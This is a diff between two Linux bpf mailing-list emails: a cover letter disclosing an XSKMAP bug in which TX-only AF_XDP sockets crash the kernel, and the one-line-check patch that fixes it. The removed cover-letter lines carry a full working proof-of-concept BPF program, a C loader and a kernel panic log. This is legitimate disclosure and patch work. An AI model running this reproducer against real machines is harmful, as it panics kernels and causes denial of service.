@@ -1,61 +1,63 @@
-Received: from mail-pj1-f54.google.com (mail-pj1-f54.google.com [209.85.216.54])
+Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 48A4E1DED5C
-	for <bpf@vger.kernel.org>; Sun, 29 Mar 2026 19:29:50 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.54
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 24A8937BE6F
+	for <bpf@vger.kernel.org>; Sun, 29 Mar 2026 19:29:54 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.180
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1774812591; cv=none; b=JhGekTxQ+c71Ppu0jz1tY/NWXHszXvICGLpetolth9+SR+lUHc/4duhcGgQFPLQp4J+5Wp5AdI4DRsuRg4uy/cFt5MhgPLiOw06HbtvZHUmik1lq2pgtwY7Z/nXEHeCod246Ofj03B2OWaseu+4JHf3iNTMarWogzdhQC2DILog=
+	t=1774812597; cv=none; b=aFC+snED+vlUr+7+pSvzl1uyh+wWJuNJQ90d9qwgZeCYpqGZOGAKOOFmU0Khhy/PUO922Xwz5q1eYnYn/pUQx1APADIW5v1JIYULH1VXN00oFG0kx33/TTsdWtKG1+bK4oxnrWZ3fJNVxdoB3p1OtY66TmFWeVgyxudW19WZFtk=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1774812591; c=relaxed/simple;
-	bh=WqqgqakgBrc2doZR2S5dZPmTOt6VmpJ8fJkSO6RqXmU=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=u1LY1qncM+7D1lFebyv/yc4hJ+HtEBZpFqyzHsk663RSPpayHSt7quRKtfJRpmeEEB1Y6X92Cg2/aiyOtE0korcY6XmDdP/+tcXEd2cRvzrGwEEEXxJNWozMog4yTKmgv/pLKkpj0uCrIyJGwbrPHiOUVghmQYm8umARNSaDUNw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=TJqmNpjN; arc=none smtp.client-ip=209.85.216.54
+	s=arc-20240116; t=1774812597; c=relaxed/simple;
+	bh=TVGIvwq7++r98D6MzS4FnxGtSITtMoooJkrNi7DUieM=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=bhVbHJ7gP59uody3WBiLeQR/oP4yHuzJxBIKw/gnJOZrQvzeWzaK8p1YqLup0Di31Rg9rZXckCC2q8be8gzQVyTOcN9l9TD8guzKvd5SsSi45DANwgukw/bCu/QtcT1CU5JHz5GAG9XjddZPICIyQuL+SdUr+vSzTctKIIVuoO4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qLDMpSKo; arc=none smtp.client-ip=209.85.214.180
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="TJqmNpjN"
-Received: by mail-pj1-f54.google.com with SMTP id 98e67ed59e1d1-35691a231a7so2206451a91.3
-        for <bpf@vger.kernel.org>; Sun, 29 Mar 2026 12:29:50 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qLDMpSKo"
+Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2b0ba3bfe16so29685075ad.1
+        for <bpf@vger.kernel.org>; Sun, 29 Mar 2026 12:29:54 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1774812590; x=1775417390; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to;
-        bh=9YegG4K4epc48M1SSnzeyN297wZvqOvGRiGaqRuTncI=;
-        b=TJqmNpjN175jfGKSHfoThbswzHA/s7bUj56dcJyPKqrHRVCDkYF8jLuFLj9i31axSb
-         1MbZe83cQ+cW7800Z/j43SPyL/DMN3GcCuVx9Iyq/84DJKHgXtsd1Ff1U3vfWjYWAn3w
-         +acbLiCqe5KwHQ5kvFbmJhw79TlWPvJZB/+C0wxAuJooqRZGbasldfkzOo93NabfIAks
-         kOHNDrK0xW4g9DeB3xIB9Ays3a7KmWb8cb4ochS7QLOMSQpGbJ8ReEl3LwhGNXmMZcpT
-         0HJFOQ8xDaw5EwVHJaTVTJutYLB0R5LSNakHt1F1DLXUrgzuEgE1ILANjAdNcp6AejXd
-         E7RA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1774812590; x=1775417390;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1774812594; x=1775417394; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to;
-        bh=9YegG4K4epc48M1SSnzeyN297wZvqOvGRiGaqRuTncI=;
-        b=HXf2kYsv/PbvZXTASjWpsYciYW/FIl7Wk2X5LLdwY1Z9IAFLhDF4BWoAoGlpQmIQ80
-         OGxgeBDwMmpmdm/uHYOY50jMwt9ve6PP/TxhQt96RtgNNWuFq4rCqvswzObkVV3uHufl
-         yq+pchiay9q5lPx34P+r7AS1TNfVUgCWMR0HxI8rk0/2QKq7eZuMBe4Ukj8nA/L/TG+V
-         x4HQLrh0vnR4z6JU9UWcJRXG6wW8R8ITJf5zrmLO5xZGZQzccBEDWp7WKdv6cfh833R+
-         Ea7M1L6Zr6OEW5yVtRFYuKhbRRslx+t3ElZ9MMMstbz/ooDfmsGAysclkaWAtrOiQvj+
-         IgPA==
-X-Forwarded-Encrypted: i=1; AJvYcCV4Xp980RH70G4NWcGwzWRdCbF1WwjrrpcBJ5xdPKeVDEfKPs/UhTTuL8zFLQlS72e3mds=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzItdmnL1OtQHmi2CVeDMvovi0FsNAf7Nkr1c8olPIChc7f3nB6
-	FTYtCGjVztVpINXczNc2kLvFYPczu+t/f+NyVDJYiPup+UNSVDTLWC1t
-X-Gm-Gg: ATEYQzzZHxeXoT2NAKBC20RB0IuywiPcwHK171nlBWWW/Ku2AOw/V7yVC9gygGWSIEn
-	dqMxktk+aZFMkrLLAmHy0gB6M8l9FJ4LASLuybOgiq0n0HAjZCABLpnd7CIEQs58TEJIiiD9Zj0
-	1bKB9xL7e+3uRd9K9UgWIMBxZJjdV4Gwx+W8s0F/YyCfHy8IKhZLwnz0fWV3EylzwLe+3XNqys3
-	PRdZ1cEw240rHo+h+1Y/3PoRKK1690SGkkZMhpjUeUYWglAgn7U7odIXaNmQn0MBaJxc7H7NdNG
-	Bk8XztSiHBfbucpaCqoDH3K+6eigtI6BF5VztPMR8YIm9kdgzuyty5zcOwXwApbbbHiZQD+5tx5
-	vcQ5aHIluK7FJrWegbAcdQugvrkw/MFfP5ttlvNTedCOpG2lKThO5HN66LkgQdq9jUMfJYVAjF6
-	aiofSTbFR5pndQEv5/rux9+zdNLPzp+7bD5QBMMkDYxDZaEA==
-X-Received: by 2002:a17:902:e952:b0:2ae:46b9:c653 with SMTP id d9443c01a7336-2b0cdcdc359mr104600515ad.33.1774812589529;
-        Sun, 29 Mar 2026 12:29:49 -0700 (PDT)
+        bh=CTz6k9vPuNqocM97eUGslil5NIJ+KRt/46MukpBHLQ8=;
+        b=qLDMpSKovunWsOxGdgNz/UsF7iACexAh3YBkrjiTziSN7bu6NglzLZ33u8Z1Pj2/1a
+         ZR52nko01rY5NwcNt8qy6SYDbAtb489lQKXz1uXMASVQCvs8sgxUriklFyvwgOl7poXc
+         lf+/inv8FU+q61SWkTQE+rFjLv76aiGHn/UaF+onC9PgVEgA1mn+c8JICLq/tkOidhzd
+         MIXLx1JuGapYXxaeSwa//2Q4KLfP5x5tuJEo1TfSsm+wl8qrJZyOKy1o1lLb4f0jZR2Q
+         AfyZTyVxz79rFjxJH4Tki3z54iECnYNnu/XZ9pAxaXa1LIaBcb0R9sWgEnb/wxVT+SAn
+         3Oaw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1774812594; x=1775417394;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=CTz6k9vPuNqocM97eUGslil5NIJ+KRt/46MukpBHLQ8=;
+        b=eJ0MGzPX5JKygkA8fVXO9ZTB2cUCsHCpiX/s1F5+y3t4U0+70zLKmg4MU4Y1ypIt4K
+         GpIdIYbIcUASBwIKyhj+cZIyOvdeBLBZ/2/F3ofgx+M9QiD+ggUXJ6ephogI1or3Tnpc
+         x6WWEP7vYg/onAyaobkumAUofiT/wPnpNfQ9F/IyaWljj+EUCHdESVjTWoigz9v6cBCm
+         AZymmD15tdVO8nx9wO75UCJhk7TxHFPNyL9r3ekpRoJxCa599E2RzRfnNkTq25OxwGQ0
+         St6z6p0fMDZtS5rGpJMMB4cIIaPrtcuAYnFx3L7nXGyH7Beh3DzKlnm5bLREKfsk4mlx
+         1e+Q==
+X-Forwarded-Encrypted: i=1; AJvYcCW7Zh9TaBzl9TSfmBsF2okvL73J1fa2i7JZSyoLDS/LyNGzEBEbKbTz3rB9IkfAbGkF95Q=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yw3CZyBC5jhxbo3/qLMnkkEcY9BKLAhYJKZGr/kNCfQDpQbH2Ng
+	id3v5L7x4rVS0Kil16xO6POeR733Q2vVSoBxUxSB6LD6ikJVZpj+g1+4
+X-Gm-Gg: ATEYQzwm0sInMyjgZ8hmL60+/Q0G3rC2DHr2AkwY63rMVXv/X6HBLnUE2y4dSg9Yl7A
+	spDB4zGoa3bEyVIvPv2GtVu+JsZ9Akn6y00Ojz7heOHBiwmrS7dJpoek0uKwL4ODXTVjGBmPEUh
+	n6y1Jfm3G8NpfbFXIVdKnO6GVKqZJL0xge1vBmUAslqEMvoGMm+4Dk6WAjkGASEOHU0vVszQ0p7
+	2JTvxRPQdnol8VtBRWJ4/eiTuYtvXpqCeF84oFDdezhQxYj/7pKTiQHVTRKzn61ejV8ThlwvRPx
+	l5WuuVBtYeezUZ0RbkBOfj1w0KNQYkNTz+8ry2GjaakSwTd6sda9i8dryZYipSRuySLKqmg9uRc
+	qkNp472Cv0afUTh7Dy23bRmPMb/j2A8T9h4dgdvhVosg9VZv/I7XXj1yQeu7wmIiOW38fjpt4AB
+	s43La8c0Zau8x9mHSOpnbvLutjHTnnOCv1rngmQL3YvqiB5w==
+X-Received: by 2002:a17:902:ea08:b0:2b2:3eec:c75b with SMTP id d9443c01a7336-2b23eecd00cmr67930985ad.2.1774812594514;
+        Sun, 29 Mar 2026 12:29:54 -0700 (PDT)
 Received: from hyj0824TXAir.sustech.edu.cn ([2001:da8:201d:1103:b2f6:47fe:9572:b2af])
-        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2b242642905sm68959585ad.17.2026.03.29.12.29.44
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2b242642905sm68959585ad.17.2026.03.29.12.29.49
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 29 Mar 2026 12:29:49 -0700 (PDT)
+        Sun, 29 Mar 2026 12:29:54 -0700 (PDT)
 From: Linpu Yu <linpu5433@gmail.com>
 To: magnus.karlsson@intel.com,
 	maciej.fijalkowski@intel.com,
@@ -75,10 +77,12 @@ Cc: sdf@fomichev.me,
 	linux-kernel@vger.kernel.org,
 	yuantan098@gmail.com,
 	yifanwucs@gmail.com
-Subject: [PATCH 0/1] xskmap: reject TX-only AF_XDP sockets
-Date: Mon, 30 Mar 2026 03:29:41 +0800
-Message-ID: <cover.1774701288.git.linpu5433@gmail.com>
+Subject: [PATCH 1/1] xskmap: reject TX-only AF_XDP sockets
+Date: Mon, 30 Mar 2026 03:29:42 +0800
+Message-ID: <6584463e576b7bb3619dc302cfecfb8ca56bc86a.1774701288.git.linpu5433@gmail.com>
 X-Mailer: git-send-email 2.53.0
+In-Reply-To: <cover.1774701288.git.linpu5433@gmail.com>
+References: <cover.1774701288.git.linpu5433@gmail.com>
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
@@ -87,355 +91,40 @@ List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi,
+Reject TX-only AF_XDP sockets from XSKMAP updates. Redirected
+packets always enter the Rx path, where the kernel expects the
+selected socket to have an Rx ring. A TX-only socket can
+currently be inserted into an XSKMAP, and redirecting a packet
+to it crashes the kernel in xsk_generic_rcv().
 
-We found and validated a low severity security issue in
-net/xdp/xskmap.c from v4.18-rc1 to v7.0-rc4. The bug can cause a
-KASAN report and panic when an XDP program redirects a packet to an
-XSKMAP entry backed by a TX-only AF_XDP socket. We have also
-included a minimum reproducer which was tested on v7.0.0-rc4.
+Keep TX-only AF_XDP sockets valid for pure Tx use, but prevent
+them from being published through XSKMAP.
 
-We will send a patch as a follow-up in this thread. We've tested
-it, and it should not affect any other functionality.
-
----- details below ----
-
-Bug details:
-xsk_map_update_elem() accepts any PF_XDP socket and does not
-require an Rx ring. A TX-only AF_XDP socket can therefore be
-inserted into an XSKMAP.
-
-When an XDP program redirects a packet through such an entry, the
-packet always enters the Rx path. The generic receive path reaches
-xsk_generic_rcv(), which assumes xs->rx is valid and dereferences
-it. With a TX-only socket, xs->rx is NULL and the kernel reports a
-KASAN null-ptr-deref before panicking.
-
-The root cause is that XSKMAP publication validates only the socket
-family, but redirect delivery requires an Rx-capable AF_XDP socket.
-
-Required kernel config:
-CONFIG_BPF
-CONFIG_BPF_SYSCALL
-CONFIG_XDP_SOCKETS
-CONFIG_VETH
-
-Reproducer:
-    clang -O2 -g -target bpf -D__TARGET_ARCH_x86         -I/usr/include/x86_64-linux-gnu -c -o poc.bpf.o poc.bpf.c
-    gcc -O2 -g -Wall -Wextra -o poc poc.c -lbpf -lelf -lz
-    sudo ./poc ./poc.bpf.o
-
-We have validated the PoC on v7.0.0-rc4 and v6.12.74.
-
----8<--- BEGIN poc.bpf.c ---8<---
-// SPDX-License-Identifier: GPL-2.0
-#include <linux/bpf.h>
-#include <bpf/bpf_helpers.h>
-
-struct {
-	__uint(type, BPF_MAP_TYPE_XSKMAP);
-	__uint(max_entries, 1);
-	__type(key, __u32);
-	__type(value, __u32);
-} xsks SEC(".maps");
-
-SEC("xdp")
-int redirect_to_xsk(struct xdp_md *ctx)
-{
-	return bpf_redirect_map(&xsks, 0, XDP_PASS);
-}
-
-char _license[] SEC("license") = "GPL";
----8<--- END poc.bpf.c ---8<---
-
----8<--- BEGIN poc.c ---8<---
-// SPDX-License-Identifier: GPL-2.0
-#define _GNU_SOURCE
-
-#include <errno.h>
-#include <net/if.h>
-#include <netinet/in.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <linux/if_link.h>
-#include <stdarg.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/resource.h>
-#include <sys/socket.h>
-#include <unistd.h>
-
-#include <bpf/bpf.h>
-#include <bpf/libbpf.h>
-#include <bpf/xsk.h>
-
-#define RX_IFACE "vethxdp0"
-#define TX_IFACE "vethxdp1"
-#define QUEUE_ID 0
-#define NUM_DESCS 64
-#define FRAME_SIZE XSK_UMEM__DEFAULT_FRAME_SIZE
-#define NUM_FRAMES 16
-#define UMEM_SIZE ((size_t)FRAME_SIZE * NUM_FRAMES)
-
-static const unsigned char rx_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
-static const unsigned char tx_mac[ETH_ALEN] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x02};
-
-static int run_cmd(const char *fmt, ...)
-{
-	char cmd[512];
-	va_list ap;
-	int rc;
-
-	va_start(ap, fmt);
-	vsnprintf(cmd, sizeof(cmd), fmt, ap);
-	va_end(ap);
-
-	rc = system(cmd);
-	if (rc)
-		fprintf(stderr, "command failed (%d): %s\n", rc, cmd);
-	return rc;
-}
-
-static int cleanup_links(void)
-{
-	return system("ip link del " RX_IFACE " >/dev/null 2>&1");
-}
-
-static int setup_links(void)
-{
-	int rc;
-
-	cleanup_links();
-
-	rc = run_cmd("ip link add " RX_IFACE " type veth peer name " TX_IFACE);
-	if (rc)
-		return -1;
-	rc = run_cmd("ip link set dev " RX_IFACE " address 02:00:00:00:00:01");
-	if (rc)
-		return -1;
-	rc = run_cmd("ip link set dev " TX_IFACE " address 02:00:00:00:00:02");
-	if (rc)
-		return -1;
-	rc = run_cmd("ip link set dev " RX_IFACE " up");
-	if (rc)
-		return -1;
-	rc = run_cmd("ip link set dev " TX_IFACE " up");
-	if (rc)
-		return -1;
-
-	return 0;
-}
-
-static int send_test_frame(int ifindex)
-{
-	unsigned char frame[64];
-	struct sockaddr_ll addr;
-	struct ethhdr *eth = (struct ethhdr *)frame;
-	int fd, ret;
-
-	memset(frame, 0x41, sizeof(frame));
-	memcpy(eth->h_dest, rx_mac, ETH_ALEN);
-	memcpy(eth->h_source, tx_mac, ETH_ALEN);
-	eth->h_proto = htons(ETH_P_IP);
-
-	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-	if (fd < 0) {
-		perror("socket(AF_PACKET)");
-		return -1;
-	}
-
-	memset(&addr, 0, sizeof(addr));
-	addr.sll_family = AF_PACKET;
-	addr.sll_protocol = htons(ETH_P_IP);
-	addr.sll_ifindex = ifindex;
-	addr.sll_halen = ETH_ALEN;
-	memcpy(addr.sll_addr, rx_mac, ETH_ALEN);
-
-	ret = sendto(fd, frame, sizeof(frame), 0,
-		     (struct sockaddr *)&addr, sizeof(addr));
-	if (ret < 0) {
-		perror("sendto");
-		close(fd);
-		return -1;
-	}
-
-	close(fd);
-	return 0;
-}
-
-static int libbpf_print_fn(enum libbpf_print_level level, const char *fmt, va_list args)
-{
-	if (level == LIBBPF_DEBUG)
-		return 0;
-	return vfprintf(stderr, fmt, args);
-}
-
-int main(int argc, char **argv)
-{
-	struct xsk_ring_prod fill = {}, tx = {};
-	struct xsk_ring_cons comp = {};
-	struct xsk_socket_config xsk_cfg = {
-		.rx_size = NUM_DESCS,
-		.tx_size = NUM_DESCS,
-		.libbpf_flags = XSK_LIBBPF_FLAGS__INHIBIT_PROG_LOAD,
-		.xdp_flags = XDP_FLAGS_SKB_MODE,
-		.bind_flags = XDP_COPY,
-	};
-	struct rlimit rlim = {
-		.rlim_cur = RLIM_INFINITY,
-		.rlim_max = RLIM_INFINITY,
-	};
-	struct xsk_umem *umem = NULL;
-	struct xsk_socket *xsk = NULL;
-	struct bpf_program *prog;
-	struct bpf_object *obj = NULL;
-	struct bpf_map *xsks_map;
-	const char *bpf_path;
-	void *umem_area = NULL;
-	int rx_ifindex = -1, tx_ifindex = -1;
-	int err = 1;
-
-	if (argc > 2) {
-		fprintf(stderr, "usage: %s [./poc.bpf.o]\n", argv[0]);
-		return 1;
-	}
-
-	bpf_path = argc == 2 ? argv[1] : "./poc.bpf.o";
-
-	libbpf_set_print(libbpf_print_fn);
-	setrlimit(RLIMIT_MEMLOCK, &rlim);
-
-	if (setup_links()) {
-		fprintf(stderr, "failed to create veth pair\n");
-		goto out;
-	}
-
-	rx_ifindex = if_nametoindex(RX_IFACE);
-	tx_ifindex = if_nametoindex(TX_IFACE);
-	if (!rx_ifindex || !tx_ifindex) {
-		fprintf(stderr, "if_nametoindex failed\n");
-		goto out;
-	}
-
-	if (posix_memalign(&umem_area, getpagesize(), UMEM_SIZE)) {
-		fprintf(stderr, "posix_memalign failed\n");
-		goto out;
-	}
-	memset(umem_area, 0, UMEM_SIZE);
-
-	err = xsk_umem__create(&umem, umem_area, UMEM_SIZE, &fill, &comp, NULL);
-	if (err) {
-		fprintf(stderr, "xsk_umem__create failed: %d\n", err);
-		goto out;
-	}
-
-	err = xsk_socket__create(&xsk, RX_IFACE, QUEUE_ID, umem, NULL, &tx, &xsk_cfg);
-	if (err) {
-		fprintf(stderr, "xsk_socket__create failed: %d\n", err);
-		goto out;
-	}
-
-	obj = bpf_object__open_file(bpf_path, NULL);
-	if (libbpf_get_error(obj)) {
-		err = (int)libbpf_get_error(obj);
-		obj = NULL;
-		fprintf(stderr, "bpf_object__open_file failed: %d\n", err);
-		goto out;
-	}
-
-	err = bpf_object__load(obj);
-	if (err) {
-		fprintf(stderr, "bpf_object__load failed: %d\n", err);
-		goto out;
-	}
-
-	prog = bpf_object__find_program_by_name(obj, "redirect_to_xsk");
-	if (!prog) {
-		fprintf(stderr, "failed to find program\n");
-		goto out;
-	}
-
-	xsks_map = bpf_object__find_map_by_name(obj, "xsks");
-	if (!xsks_map) {
-		fprintf(stderr, "failed to find xsks map\n");
-		goto out;
-	}
-
-	err = bpf_set_link_xdp_fd(rx_ifindex, bpf_program__fd(prog), XDP_FLAGS_SKB_MODE);
-	if (err) {
-		fprintf(stderr, "bpf_set_link_xdp_fd attach failed: %d\n", err);
-		goto out;
-	}
-
-	err = xsk_socket__update_xskmap(xsk, bpf_map__fd(xsks_map));
-	if (err) {
-		fprintf(stderr, "xsk_socket__update_xskmap failed: %d\n", err);
-		goto out;
-	}
-
-	fprintf(stderr, "sending one frame into %s queue %d\n", RX_IFACE, QUEUE_ID);
-	fflush(stderr);
-
-	if (send_test_frame(tx_ifindex))
-		goto out;
-
-	sleep(2);
-	fprintf(stderr, "no crash observed\n");
-	err = 0;
-
-out:
-	if (rx_ifindex > 0)
-		bpf_set_link_xdp_fd(rx_ifindex, -1, XDP_FLAGS_SKB_MODE);
-	if (xsk)
-		xsk_socket__delete(xsk);
-	if (umem)
-		xsk_umem__delete(umem);
-	free(umem_area);
-	if (obj)
-		bpf_object__close(obj);
-	cleanup_links();
-	return err;
-}
----8<--- END poc.c ---8<---
-
-Crash log:
-[  628.881280][    C0] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000001: 0000 [#1] PREEMPT SMP KASAN NOPTI
-[  628.882528][    C0] KASAN: null-ptr-deref in range [0x0000000000000008-0x000000000000000f]
-[  628.883234][    C0] CPU: 0 UID: 0 PID: 10251 Comm: poc Not tainted 6.12.74 #3
-[  628.883828][    C0] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  628.884701][    C0] RIP: 0010:xsk_generic_rcv+0x1c1/0x460
-[  628.885258][    C0] Code: 48 c1 ea 03 80 3c 02 00 0f 85 a0 02 00 00 48 8b 9d 80 05 00 00 48 b8 00 00 00 00 00 fc ff df 48 8d 7b 08 48 89 fa 48 c1 ea 03 <0f> b6 04 02 84 c0 74 09 3c 03 7f 05 e8 5e d6 ee f6 44 8b 73 08 48
-[  628.886884][    C0] RSP: 0018:ffffc90000007738 EFLAGS: 00010212
-[  628.887445][    C0] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffff88803fe40800
-[  628.888062][    C0] RDX: 0000000000000001 RSI: ffffffff8b08bfc6 RDI: 0000000000000008
-[  628.888699][    C0] RBP: ffff88803fe40800 R08: 0000000000000004 R09: 0000000000000000
-[  628.889359][    C0] R10: 0000000000000000 R11: 0000000000000001 R12: 00000000fffffff4
-[  628.889985][    C0] R13: ffff88803fe40da8 R14: 0000000000000040 R15: ffffc90000007e98
-[  628.890669][    C0] FS:  00007f7fe6b52740(0000) GS:ffff88806a800000(0000) knlGS:0000000000000000
-[  628.891406][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[  628.891949][    C0] CR2: 00007f7fe6c9f350 CR3: 0000000031de6000 CR4: 0000000000750ef0
-[  628.892613][    C0] PKRU: 55555554
-[  628.892925][    C0] Call Trace:
-[  628.893226][    C0]  <IRQ>
-[  628.945597][    C0] Modules linked in:
-[  628.946047][    C0] ---[ end trace 0000000000000000 ]---
-[  628.946512][    C0] RIP: 0010:xsk_generic_rcv+0x1c1/0x460
-[  628.954560][    C0] Kernel panic - not syncing: Fatal exception in interrupt
-[  628.955982][    C0] Kernel Offset: disabled
-
-Best regards
-Linpu Yu
-
-
-Linpu Yu (1):
-  xskmap: reject TX-only AF_XDP sockets
-
+Fixes: fbfc504a24f5 ("bpf: introduce new bpf AF_XDP map type BPF_MAP_TYPE_XSKMAP")
+Reported-by: Juefei Pu <tomapufckgml@gmail.com>
+Reported-by: Yuan Tan <yuantan098@gmail.com>
+Signed-off-by: Xin Liu <bird@lzu.edu.cn>
+Signed-off-by: Yifan Wu <yifanwucs@gmail.com>
+Signed-off-by: Linpu Yu <linpu5433@gmail.com>
+---
  net/xdp/xskmap.c | 4 ++++
  1 file changed, 4 insertions(+)
 
+diff --git a/net/xdp/xskmap.c b/net/xdp/xskmap.c
+index afa457506274c..6dac59ebb5cf0 100644
+--- a/net/xdp/xskmap.c
++++ b/net/xdp/xskmap.c
+@@ -184,6 +184,10 @@ static long xsk_map_update_elem(struct bpf_map *map, void *key, void *value,
+ 	}
+ 
+ 	xs = (struct xdp_sock *)sock->sk;
++	if (!READ_ONCE(xs->rx)) {
++		sockfd_put(sock);
++		return -EINVAL;
++	}
+ 
+ 	map_entry = &m->xsk_map[i];
+ 	node = xsk_map_node_alloc(m, map_entry);
 -- 
 2.53.0
 
